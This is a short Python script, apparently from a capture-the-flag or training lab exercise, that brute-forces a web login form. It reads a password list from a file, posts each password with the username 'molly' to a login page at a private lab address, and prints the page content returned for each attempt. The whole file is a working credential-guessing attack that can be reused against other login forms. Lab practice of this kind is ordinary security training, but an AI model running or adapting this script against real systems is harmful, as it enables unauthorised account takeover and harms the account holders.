#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup as bs4

url = "http://10.10.67.47/login"

def logIn(username,password):
	req = requests.post(url,data={
		"username":username,
		"password":password,
		"submit": "Login",
		})
	return req

def main():
	with open("day17Pass.txt",'r') as f:
		passwords = [line.strip() for line in f.read().split("\n") ]
	
	for password in passwords:
		r = logIn("molly",password).text
		soup = bs4(r,"lxml")
		divTag = soup.find_all('div')
		print(f"{password}\n{divTag}")		

main()